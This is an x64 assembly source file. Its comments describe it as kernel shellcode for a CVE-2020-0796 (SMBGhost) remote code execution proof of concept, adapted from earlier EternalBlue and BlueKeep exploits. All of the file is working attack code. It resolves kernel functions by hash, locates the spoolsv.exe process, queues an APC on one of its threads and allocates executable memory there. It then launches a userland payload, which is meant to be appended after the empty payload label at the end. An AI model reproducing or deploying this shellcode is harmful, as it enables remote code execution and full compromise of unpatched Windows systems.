; Shellcode for CVE-2020-0796 (SMBGhost) Remote Code Execution POC
; Based on:
; https://github.com/rapid7/metasploit-framework/blob/129d15b8eb092b061e50f2e96a03b6a1a7b642b5/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb
; - Removed ntoskrnl base search, it's passed as an argument.
; - Fixed finding offset of ETHREAD.ThreadListEntry if current thread is attached to a
;   different process than the one it was originally created in.
; - Adapted UserApcPending check for Win10 R5 and newer.
;
; Windows x64 kernel shellcode from ring 0 to ring 3 by sleepya
;
; This shellcode was written originally for eternalblue exploits
; eternalblue_exploit7.py and eternalblue_exploit8.py
;
; Idea for Ring 0 to Ring 3 via APC from Sean Dillon (@zerosum0x0)
;
; Note:
; - The userland shellcode is run in a new thread of system process.
;     If userland shellcode causes any exception, the system process get killed.
; - On idle target with multiple core processors, the hijacked system call
;     might take a while (> 5 minutes) to get called because the system
;     call may be called on other processors.
; - The shellcode does not allocate shadow stack if possible for minimal shellcode size.
;     This is ok because some Windows functions do not require a shadow stack.
; - Compiling shellcode with specific Windows version macro, corrupted buffer will be freed.
;     Note: the Windows 8 version macros are removed below
; - The userland payload MUST be appended to this shellcode.
;
; References:
; - http://www.geoffchappell.com/studies/windows/km/index.htm (structures info)
; - https://github.com/reactos/reactos/blob/master/reactos/ntoskrnl/ke/apc.c

BITS 64
ORG 0

DATA_KAPC_OFFSET           EQU 0x30

DATA_NT_KERNEL_ADDR_OFFSET EQU 0x8
DATA_ORIGIN_SYSCALL_OFFSET EQU 0
DATA_PEB_ADDR_OFFSET       EQU -0x10
DATA_QUEUEING_KAPC_OFFSET  EQU -0x8

; These hashes are not the same as the ones used by the
; Block API so they have to be hard-coded.
CREATETHREAD_HASH              EQU 0x835e515e
KEINITIALIZEAPC_HASH           EQU 0x6d195cc4
KEINSERTQUEUEAPC_HASH          EQU 0xafcc4634
PSGETCURRENTPROCESS_HASH       EQU 0xdbf47c78
IOTHREADTOPROCESS_HASH         EQU 0x789b9fb4
PSGETPROCESSID_HASH            EQU 0x170114e1
PSGETPROCESSIMAGEFILENAME_HASH EQU 0x77645f3f
PSGETPROCESSPEB_HASH           EQU 0xb818b848
PSGETTHREADTEB_HASH            EQU 0xcef84c3e
SPOOLSV_EXE_HASH               EQU 0x3ee083d8
ZWALLOCATEVIRTUALMEMORY_HASH   EQU 0x576e99ea

section .text
global shellcode_start

;========================================================================
; Arguments: rcx = ntoskrnl base address
;========================================================================
shellcode_start:
    ;int 0x3

    push rbp
    call set_rbp_data_address_fn

    ; allow interrupts while executing shellcode
    ;sti
    call r3_to_r0_start
    ;cli

    pop rbp
    ret

;========================================================================
; Find memory address for using as data area
; Return: rbp = data address
;========================================================================
set_rbp_data_address_fn:
    ; On idle target without user application, syscall on hijacked processor might not be called immediately.
    ; Find some address to store the data, the data in this address MUST not be modified
    ;   when exploit is rerun before syscall is called
    lea rbp, [rel _set_rbp_data_address_fn_next + 0x1000]
_set_rbp_data_address_fn_next:
    shr rbp, 12
    shl rbp, 12
    sub rbp, 0x200   ; for KAPC struct too
    ret

;========================================================================
; Arguments: rcx = ntoskrnl base address
;========================================================================
r3_to_r0_start:
    ; save used non-volatile registers
    push r15
    push r14
    push rdi
    push rsi
    push rbx
    sub rsp, 0x20

    ;======================================
    ; first argument - nt kernel address
    ;======================================
    mov r15, rcx

    ; save nt address for using in KernelApcRoutine
    mov [rbp+DATA_NT_KERNEL_ADDR_OFFSET], r15

    ;======================================
    ; get current ETHREAD
    ;======================================
    mov r14, qword [gs:0x188]    ; get _ETHREAD pointer from KPCR

    ; r15 : nt kernel address
    ; r14 : ETHREAD

    ;======================================
    ; find offset of EPROCESS.ImageFilename
    ;======================================
    mov edi, PSGETPROCESSIMAGEFILENAME_HASH
    call get_proc_addr
    mov eax, dword [rax+3]  ; get offset from code (offset of ImageFilename is always > 0x7f)
    mov ebx, eax        ; ebx = offset of EPROCESS.ImageFilename

    ;======================================
    ; find offset of EPROCESS.ThreadListHead
    ;======================================
    ; possible diff from ImageFilename offset is 0x28 and 0x38 (Win8+)
    ; if offset of ImageFilename is more than 0x400, current is (Win8+)

    cmp eax, 0x400      ; eax is still an offset of EPROCESS.ImageFilename
    jb _find_eprocess_threadlist_offset_win7
    add eax, 0x10
_find_eprocess_threadlist_offset_win7:
    lea rdx, [rax+0x28] ; edx = offset of EPROCESS.ThreadListHead

    ;======================================
    ; find offset of ETHREAD.ThreadListEntry
    ;======================================

    mov rcx, r14
    mov edi, IOTHREADTOPROCESS_HASH
    call win_api_direct
    lea r8, [rax+rdx]   ; r8 = address of EPROCESS.ThreadListHead
    mov r9, r8

    ; ETHREAD.ThreadListEntry must be between ETHREAD (r14) and ETHREAD+0x700
_find_ethread_threadlist_offset_loop:
    mov r9, qword [r9]

    cmp r8, r9          ; check end of list
    je _insert_queue_apc_done    ; not found !!!

    ; if (r9 - r14 < 0x700) found
    mov rax, r9
    sub rax, r14
    cmp rax, 0x700
    ja _find_ethread_threadlist_offset_loop
    sub r14, r9         ; r14 = -(offset of ETHREAD.ThreadListEntry)

    ;======================================
    ; get current EPROCESS
    ;======================================
    mov edi, PSGETCURRENTPROCESS_HASH
    call win_api_direct
    xchg rcx, rax       ; rcx = EPROCESS

    ;======================================
    ; find offset of EPROCESS.ActiveProcessLinks
    ;======================================
    mov edi, PSGETPROCESSID_HASH
    call get_proc_addr
    mov edi, dword [rax+3]  ; get offset from code (offset of UniqueProcessId is always > 0x7f)
    add edi, 8      ; edi = offset of EPROCESS.ActiveProcessLinks = offset of EPROCESS.UniqueProcessId + sizeof(EPROCESS.UniqueProcessId)

    ;======================================
    ; find target process by iterating over EPROCESS.ActiveProcessLinks WITHOUT lock
    ;======================================
    ; check process name

    xor eax, eax      ; HACK to exit earlier if process not found

_find_target_process_loop:
    lea rsi, [rcx+rbx]

    push rax
    call calc_hash
    cmp eax, SPOOLSV_EXE_HASH  ; "spoolsv.exe"
    pop rax
    jz found_target_process

;---------- HACK PROCESS NOT FOUND start -----------
    inc rax
    cmp rax, 0x300      ; HACK not found!
    jne _next_find_target_process
    xor ecx, ecx
    ; clear queueing kapc flag, allow other hijacked system call to run shellcode
    mov byte [rbp+DATA_QUEUEING_KAPC_OFFSET], cl

    jmp _r3_to_r0_done

;---------- HACK PROCESS NOT FOUND end -----------

_next_find_target_process:
    ; next process
    mov rcx, [rcx+rdi]
    sub rcx, rdi
    jmp _find_target_process_loop


found_target_process:
    ; The allocation for userland payload will be in KernelApcRoutine.
    ; KernelApcRoutine is run in a target process context. So no need to use KeStackAttachProcess()

    ;======================================
    ; save process PEB for finding CreateThread address in kernel KAPC routine
    ;======================================
    mov edi, PSGETPROCESSPEB_HASH
    ; rcx is EPROCESS. no need to set it.
    call win_api_direct
    mov [rbp+DATA_PEB_ADDR_OFFSET], rax


    ;======================================
    ; iterate ThreadList until KeInsertQueueApc() success
    ;======================================
    ; r15 = nt
    ; r14 = -(offset of ETHREAD.ThreadListEntry)
    ; rcx = EPROCESS
    ; edx = offset of EPROCESS.ThreadListHead


    lea rsi, [rcx + rdx]    ; rsi = ThreadListHead address
    mov rbx, rsi    ; use rbx for iterating thread

    ; checking alertable from ETHREAD structure is not reliable because each Windows version has different offset.
    ; Moreover, alertable thread need to be waiting state which is more difficult to check.
    ; try queueing APC then check KAPC member is more reliable.

_insert_queue_apc_loop:
    ; move backward because non-alertable and NULL TEB.ActivationContextStackPointer threads always be at front
    mov rbx, [rbx+8]

    cmp rsi, rbx
    je _insert_queue_apc_loop   ; skip list head

    ; find start of ETHREAD address
    ; set it to rdx to be used for KeInitializeApc() argument too
    lea rdx, [rbx + r14]    ; ETHREAD

    ; userland shellcode (at least CreateThread() function) need non NULL TEB.ActivationContextStackPointer.
    ; the injected process will be crashed because of access violation if TEB.ActivationContextStackPointer is NULL.
    ; Note: APC routine does not require non-NULL TEB.ActivationContextStackPointer.
    ; from my observation, KTRHEAD.Queue is always NULL when TEB.ActivationContextStackPointer is NULL.
    ; Teb member is next to Queue member.
    mov edi, PSGETTHREADTEB_HASH
    call get_proc_addr
    mov eax, dword [rax+3]      ; get offset from code (offset of Teb is always > 0x7f)
    cmp qword [rdx+rax-8], 0    ; KTHREAD.Queue MUST not be NULL
    je _insert_queue_apc_loop

    ; KeInitializeApc(PKAPC,
    ;                 PKTHREAD,
    ;                 KAPC_ENVIRONMENT = OriginalApcEnvironment (0),
    ;                 PKKERNEL_ROUTINE = kernel_apc_routine,
    ;                 PKRUNDOWN_ROUTINE = NULL,
    ;                 PKNORMAL_ROUTINE = userland_shellcode,
    ;                 KPROCESSOR_MODE = UserMode (1),
    ;                 PVOID Context);
    lea rcx, [rbp+DATA_KAPC_OFFSET]     ; PAKC
    xor r8, r8      ; OriginalApcEnvironment
    lea r9, [rel kernel_kapc_routine]    ; KernelApcRoutine
    push rbp    ; context
    push 1      ; UserMode
    push rbp    ; userland shellcode (MUST NOT be NULL)
    push r8     ; NULL
    sub rsp, 0x20   ; shadow stack
    mov edi, KEINITIALIZEAPC_HASH
    call win_api_direct
    ; Note: KeInsertQueueApc() requires shadow stack. Adjust stack back later

    ; BOOLEAN KeInsertQueueApc(PKAPC, SystemArgument1, SystemArgument2, 0);
    ;   SystemArgument1 is second argument in usermode code (rdx)
    ;   SystemArgument2 is third argument in usermode code (r8)
    lea rcx, [rbp+DATA_KAPC_OFFSET]
    ;xor edx, edx   ; no need to set it here
    ;xor r8, r8     ; no need to set it here
    xor r9, r9
    mov edi, KEINSERTQUEUEAPC_HASH
    call win_api_direct
    add rsp, 0x40
    ; if insertion failed, try next thread
    test eax, eax
    jz _insert_queue_apc_loop

    mov rax, [rbp+DATA_KAPC_OFFSET+0x10]     ; get KAPC.ApcListEntry
    ; EPROCESS pointer 8 bytes
    ; InProgressFlags 1 byte
    ; KernelApcPending 1 byte
    ; * Since Win10 R5:
    ;   Bit 0: SpecialUserApcPending
    ;   Bit 1: UserApcPending
    ; if success, UserApcPending MUST be 1
    test byte [rax+0x1a], 2
    jnz _insert_queue_apc_done

    ; manual remove list without lock
    mov [rax], rax
    mov [rax+8], rax
    jmp _insert_queue_apc_loop

_insert_queue_apc_done:
    ; The PEB address is needed in kernel_apc_routine. Setting QUEUEING_KAPC to 0 should be in kernel_apc_routine.

_r3_to_r0_done:
    add rsp, 0x20
    pop rbx
    pop rsi
    pop rdi
    pop r14
    pop r15
    ret

;========================================================================
; Call function in specific module
;
; All function arguments are passed as calling normal function with extra register arguments
; Extra Arguments: r15 = module pointer
;                  edi = hash of target function name
;========================================================================
win_api_direct:
    call get_proc_addr
    jmp rax


;========================================================================
; Get function address in specific module
;
; Arguments: r15 = module pointer
;            edi = hash of target function name
; Return: eax = offset
;========================================================================
get_proc_addr:
    ; Save registers
    push rbx
    push rcx
    push rsi                ; for using calc_hash

    ; use rax to find EAT
    mov eax, dword [r15+60]  ; Get PE header e_lfanew
    mov eax, dword [r15+rax+136] ; Get export tables RVA

    add rax, r15
    push rax                 ; save EAT

    mov ecx, dword [rax+24]  ; NumberOfFunctions
    mov ebx, dword [rax+32]  ; FunctionNames
    add rbx, r15

_get_proc_addr_get_next_func:
    ; When we reach the start of the EAT (we search backwards), we hang or crash
    dec ecx                     ; decrement NumberOfFunctions
    mov esi, dword [rbx+rcx*4]  ; Get rva of next module name
    add rsi, r15                ; Add the modules base address

    call calc_hash

    cmp eax, edi                        ; Compare the hashes
    jnz _get_proc_addr_get_next_func    ; try the next function

_get_proc_addr_finish:
    pop rax                     ; restore EAT
    mov ebx, dword [rax+36]
    add rbx, r15                ; ordinate table virtual address
    mov cx, word [rbx+rcx*2]    ; desired functions ordinal
    mov ebx, dword [rax+28]     ; Get the function addresses table rva
    add rbx, r15                ; Add the modules base address
    mov eax, dword [rbx+rcx*4]  ; Get the desired functions RVA
    add rax, r15                ; Add the modules base address to get the functions actual VA

    pop rsi
    pop rcx
    pop rbx
    ret

;========================================================================
; Calculate ASCII string hash. Useful for comparing ASCII string in shellcode.
;
; Argument: rsi = string to hash
; Clobber: rsi
; Return: eax = hash
;========================================================================
calc_hash:
    push rdx
    xor eax, eax
    cdq
_calc_hash_loop:
    lodsb                   ; Read in the next byte of the ASCII string
    ror edx, 13             ; Rotate right our hash value
    add edx, eax            ; Add the next byte of the string
    test eax, eax           ; Stop when found NULL
    jne _calc_hash_loop
    xchg edx, eax
    pop rdx
    ret


; KernelApcRoutine is called when IRQL is APC_LEVEL in (queued) Process context.
; But the IRQL is simply raised from PASSIVE_LEVEL in KiCheckForKernelApcDelivery().
; Moreover, there is no lock when calling KernelApcRoutine.
; So KernelApcRoutine can simply lower the IRQL by setting cr8 register.
;
; VOID KernelApcRoutine(
;           IN PKAPC Apc,
;           IN PKNORMAL_ROUTINE *NormalRoutine,
;           IN PVOID *NormalContext,
;           IN PVOID *SystemArgument1,
;           IN PVOID *SystemArgument2)
kernel_kapc_routine:
    push rbp
    push rbx
    push rdi
    push rsi
    push r15

    mov rbp, [r8]       ; *NormalContext is our data area pointer

    mov r15, [rbp+DATA_NT_KERNEL_ADDR_OFFSET]
    push rdx
    pop rsi     ; mov rsi, rdx
    mov rbx, r9

    ;======================================
    ; ZwAllocateVirtualMemory(-1, &baseAddr, 0, &0x1000, 0x1000, 0x40)
    ;======================================
    xor eax, eax
    mov cr8, rax    ; set IRQL to PASSIVE_LEVEL (ZwAllocateVirtualMemory() requires)
    ; rdx is already address of baseAddr
    mov [rdx], rax      ; baseAddr = 0
    mov ecx, eax
    not rcx             ; ProcessHandle = -1
    mov r8, rax         ; ZeroBits
    mov al, 0x40    ; eax = 0x40
    push rax            ; PAGE_EXECUTE_READWRITE = 0x40
    shl eax, 6      ; eax = 0x40 << 6 = 0x1000
    push rax            ; MEM_COMMIT = 0x1000
    ; reuse r9 for address of RegionSize
    mov [r9], rax       ; RegionSize = 0x1000
    sub rsp, 0x20   ; shadow stack
    mov edi, ZWALLOCATEVIRTUALMEMORY_HASH
    call win_api_direct
    add rsp, 0x30

    ; check error
    test eax, eax
    jnz _kernel_kapc_routine_exit

    ;======================================
    ; copy userland payload
    ;======================================
    mov rdi, [rsi]
    lea rsi, [rel userland_start_thread]
    mov ecx, 0x380  ; fix payload size to 0x380 bytes

    rep movsb

    ;======================================
    ; find CreateThread address (in kernel32.dll)
    ;======================================
    mov rax, [rbp+DATA_PEB_ADDR_OFFSET]
    mov rax, [rax + 0x18]       ; PEB->Ldr
    mov rax, [rax + 0x20]       ; InMemoryOrder list

    ;lea rsi, [rcx + rdx]    ; rsi = ThreadListHead address
    ;mov rbx, rsi    ; use rbx for iterating thread
_find_kernel32_dll_loop:
    mov rax, [rax]       ; first one always be executable
    ; offset 0x38 (WORD)  => must be 0x40 (full name len c:\windows\system32\kernel32.dll)
    ; offset 0x48 (WORD)  => must be 0x18 (name len kernel32.dll)
    ; offset 0x50  => is name
    ; offset 0x20  => is dllbase
    ;cmp word [rax+0x38], 0x40
    ;jne _find_kernel32_dll_loop
    cmp word [rax+0x48], 0x18
    jne _find_kernel32_dll_loop

    mov rdx, [rax+0x50]
    ; check only "32" because name might be lowercase or uppercase
    cmp dword [rdx+0xc], 0x00320033   ; 3\x002\x00
    jnz _find_kernel32_dll_loop

    mov r15, [rax+0x20]
    mov edi, CREATETHREAD_HASH
    call get_proc_addr

    ; save CreateThread address to SystemArgument1
    mov [rbx], rax

_kernel_kapc_routine_exit:
    xor ecx, ecx
    ; clear queueing kapc flag, allow other hijacked system call to run shellcode
    mov byte [rbp+DATA_QUEUEING_KAPC_OFFSET], cl
    ; restore IRQL to APC_LEVEL
    mov cl, 1
    mov cr8, rcx

    pop r15
    pop rsi
    pop rdi
    pop rbx
    pop rbp
    ret

userland_start_thread:
    ; CreateThread(NULL, 0, &threadstart, NULL, 0, NULL)
    xchg rdx, rax   ; rdx is CreateThread address passed from kernel
    xor ecx, ecx    ; lpThreadAttributes = NULL
    push rcx        ; lpThreadId = NULL
    push rcx        ; dwCreationFlags = 0
    mov r9, rcx     ; lpParameter = NULL
    lea r8, [rel userland_payload]  ; lpStartAddr
    mov edx, ecx    ; dwStackSize = 0
    sub rsp, 0x20
    call rax
    add rsp, 0x30
    ret

userland_payload:
